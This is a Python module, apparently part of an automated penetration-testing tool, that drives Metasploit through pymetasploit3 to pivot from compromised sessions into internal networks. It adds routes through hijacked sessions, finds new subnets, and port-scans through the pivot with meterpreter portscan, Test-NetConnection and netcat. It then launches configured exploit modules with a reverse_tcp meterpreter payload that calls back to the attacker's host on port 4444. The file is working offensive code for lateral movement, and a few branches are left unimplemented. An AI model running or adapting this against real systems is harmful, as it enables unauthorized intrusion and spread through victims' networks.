#!/usr/bin/env python3

import logging
import subprocess
import os
import time
import json
from typing import Dict, List
from pymetasploit3.msfrpc import MsfRpcClient
import ipaddress
import socket

logger = logging.getLogger(__name__)

class Pivoting:
    def __init__(self, msf_client: MsfRpcClient, config: Dict):
        """Inicializa el módulo de pivoting"""
        self.msf_client = msf_client
        self.config = config
        self.temp_dir = os.path.join(os.path.dirname(__file__), "..", "..", "temp")
        os.makedirs(self.temp_dir, exist_ok=True)
    
    def setup_pivot(self, session_id: str, target_network: str) -> Dict:
        """Configura pivoting desde una sesión establecida"""
        result = {
            "success": False,
            "details": "",
            "routes": []
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Obtener información de la sesión
            session = self.msf_client.sessions.session(session_id)
            if not session:
                return result
            
            # Configurar ruta según el tipo de sesión
            if session.type == "meterpreter":
                # Configurar ruta en Metasploit
                cmd = f"route add {target_network} {session_id}"
                self.msf_client.consoles.console().write(cmd)
                
                # Verificar ruta
                routes = self.msf_client.consoles.console().read()
                if target_network in routes:
                    result.update({
                        "success": True,
                        "details": f"Route added for {target_network}",
                        "routes": [target_network]
                    })
            
            elif session.type == "shell":
                # Configurar ruta en el sistema
                if "windows" in session.platform:
                    cmd = f"route add {target_network} mask 255.255.255.0 {session_id}"
                else:
                    cmd = f"ip route add {target_network} via {session_id}"
                
                session.shell.write(cmd)
                result.update({
                    "success": True,
                    "details": f"Route added for {target_network}",
                    "routes": [target_network]
                })
        
        except Exception as e:
            logger.error(f"Error al configurar pivoting: {str(e)}")
        
        return result
    
    def discover_new_networks(self, session_id: str) -> List[str]:
        """Descubre nuevas redes desde una sesión establecida"""
        networks = []
        
        try:
            if not self.msf_client:
                return networks
            
            # Obtener información de la sesión
            session = self.msf_client.sessions.session(session_id)
            if not session:
                return networks
            
            # Ejecutar comandos según el tipo de sesión
            if session.type == "meterpreter":
                # Obtener interfaces de red
                interfaces = session.net.config.interfaces
                for interface in interfaces:
                    if interface.get("ip"):
                        network = self._get_network_from_ip(interface["ip"], interface.get("netmask", "255.255.255.0"))
                        if network and network not in networks:
                            networks.append(network)
            
            elif session.type == "shell":
                # Ejecutar comandos para obtener interfaces
                if "windows" in session.platform:
                    cmd = "ipconfig"
                else:
                    cmd = "ifconfig"
                
                output = session.shell.write(cmd)
                networks.extend(self._parse_network_info(output))
        
        except Exception as e:
            logger.error(f"Error al descubrir redes: {str(e)}")
        
        return networks
    
    def scan_through_pivot(self, session_id: str, target: str, ports: List[int]) -> Dict:
        """Realiza escaneo a través de un pivote"""
        result = {
            "success": False,
            "details": "",
            "open_ports": []
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Obtener información de la sesión
            session = self.msf_client.sessions.session(session_id)
            if not session:
                return result
            
            # Configurar escaneo según el tipo de sesión
            if session.type == "meterpreter":
                # Usar módulo de Metasploit para escaneo
                for port in ports:
                    cmd = f"portscan {target} {port} {port} tcp"
                    output = session.run_with_output(cmd)
                    if "open" in output.lower():
                        result["open_ports"].append(port)
            
            elif session.type == "shell":
                # Usar comandos nativos para escaneo
                if "windows" in session.platform:
                    for port in ports:
                        cmd = f"Test-NetConnection -ComputerName {target} -Port {port}"
                        output = session.shell.write(cmd)
                        if "TcpTestSucceeded : True" in output:
                            result["open_ports"].append(port)
                else:
                    for port in ports:
                        cmd = f"nc -zv {target} {port} -w 1"
                        output = session.shell.write(cmd)
                        if "open" in output.lower():
                            result["open_ports"].append(port)
            
            if result["open_ports"]:
                result.update({
                    "success": True,
                    "details": f"Found {len(result['open_ports'])} open ports"
                })
        
        except Exception as e:
            logger.error(f"Error al escanear a través de pivote: {str(e)}")
        
        return result
    
    def exploit_through_pivot(self, session_id: str, target: str, port: int, service: str) -> Dict:
        """Realiza explotación a través de un pivote"""
        result = {
            "success": False,
            "details": "",
            "session_id": None
        }
        
        try:
            if not self.msf_client:
                return result
            
            # Obtener información de la sesión pivote
            pivot_session = self.msf_client.sessions.session(session_id)
            if not pivot_session:
                return result
            
            # Configurar explotación según el tipo de sesión pivote
            if pivot_session.type == "meterpreter":
                # Usar módulos de Metasploit a través del pivote
                modules = self.config.get("tools", {}).get("metasploit", {}).get("modules", {}).get(service, [])
                
                for module in modules:
                    try:
                        # Configurar exploit
                        exploit = self.msf_client.modules.use('exploit', module)
                        exploit['RHOSTS'] = target
                        exploit['RPORT'] = port
                        exploit['SESSION'] = session_id
                        
                        # Configurar payload
                        payload = self.config.get("exploit_modules", {}).get(service, {}).get("payload", "windows/meterpreter/reverse_tcp")
                        payload_obj = self.msf_client.modules.use('payload', payload)
                        payload_obj['LHOST'] = self._get_local_ip()
                        payload_obj['LPORT'] = 4444
                        
                        # Ejecutar exploit
                        exploit.execute(payload=payload_obj)
                        
                        # Esperar sesión
                        time.sleep(10)
                        sessions = self.msf_client.sessions.list
                        
                        if sessions:
                            new_session_id = list(sessions.keys())[-1]
                            result.update({
                                "success": True,
                                "details": f"Session {new_session_id} established through pivot",
                                "session_id": new_session_id
                            })
                            break
                    
                    except Exception as e:
                        logger.error(f"Error al ejecutar módulo {module}: {str(e)}")
            
            elif pivot_session.type == "shell":
                # Usar comandos nativos a través del pivote
                if "windows" in pivot_session.platform:
                    # Implementar explotación Windows a través de shell
                    pass
                else:
                    # Implementar explotación Linux a través de shell
                    pass
        
        except Exception as e:
            logger.error(f"Error al explotar a través de pivote: {str(e)}")
        
        return result
    
    def _get_network_from_ip(self, ip: str, netmask: str) -> str:
        """Calcula la red a partir de una IP y máscara"""
        try:
            network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
            return str(network.network_address) + "/" + str(network.prefixlen)
        except:
            return None
    
    def _parse_network_info(self, output: str) -> List[str]:
        """Parsea la salida de comandos de red para extraer redes"""
        networks = []
        try:
            # Buscar patrones de IP y máscara
            import re
            ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
            mask_pattern = r"(?:255\.255\.255\.0|255\.255\.0\.0|255\.0\.0\.0)"
            
            ips = re.findall(ip_pattern, output)
            masks = re.findall(mask_pattern, output)
            
            for ip, mask in zip(ips, masks):
                network = self._get_network_from_ip(ip, mask)
                if network and network not in networks:
                    networks.append(network)
        except:
            pass
        return networks
    
    def _get_local_ip(self) -> str:
        """Obtiene la IP local para payloads"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1" 